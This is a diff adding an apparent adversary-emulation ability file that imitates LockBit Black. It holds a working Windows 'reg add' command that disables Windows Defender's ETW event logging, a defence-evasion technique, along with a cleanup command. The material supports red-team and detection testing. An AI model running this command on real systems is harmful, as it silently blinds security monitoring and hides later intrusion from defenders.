@@ -1,0 +1,19 @@
+- description: 'An adversary can disable the ETW Provider of Windows Defender,
+
+    so nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.
+
+    '
+  id: 8725359f7529791717634d8fdd8948e6
+  name: LockBit Black - Disable the ETW Provider of Windows Defender -cmd
+  platforms:
+    windows:
+      cmd:
+        cleanup: reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows
+          Defender" /v Operational /f >nul 2>&1
+        command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows
+          Defender" /v Operational /t REG_DWORD /d 0 /f
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.006
+    name: 'Impair Defenses: Indicator Blocking'
